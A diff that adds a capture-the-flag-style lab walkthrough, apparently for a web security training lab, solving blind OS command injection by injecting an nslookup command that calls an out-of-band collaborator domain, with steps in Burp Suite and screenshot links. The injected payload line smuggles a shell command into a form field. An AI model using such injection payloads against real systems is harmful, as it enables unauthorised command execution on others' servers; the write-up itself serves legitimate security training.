@@ -108,11 +108,52 @@ We have successfully solved this lab.
 
 -------------------------
 
-#
+# Blind OS command injection with out-of-band interaction
 <hr>
 
 ## Task
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ae96badf-72cb-400b-b270-8c704e0373f5)
+
+Navigate to the webpage,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ac7e3195-6efd-460d-b369-40e0886ed896)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/90e46c2b-b787-4cb6-a677-12b5553a9096)
+
+Capture this request on burpsuite and send it over to burp repeater
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/64fd3693-d050-4455-bd98-7053b2bba741)
+
+so, to solve this lab we have to issue a DNS lookup to burp collaborator
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4fab75bf-9313-402e-b06c-527560ceff3e)
+
+Click on "copy to clipboard" to copy the payload to use. So we can use ```nslookup``` with the payload burp collaborator client generated for us
+```
+||nslookup 2ad7n17mkusj9u18hveevnj8zz5pte.oastify.com||
+```
+Ensure it is url encoded
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/10a8d6f5-7a53-4978-bb60-7cc1a6b4e298)
+
+Checking the burp collaborator client window
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b30d0fcf-e2f0-48af-ab0d-fde372a9626e)
+
+We have successfully sent a DNS query
+
+Checking the webpage again,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/714cb00f-8d68-4769-b89f-3c86d4376771)
+
+We have successfully solved the task
+
+------------------------------------
+
+#
+<hr>
+
+## Task
 
 
 
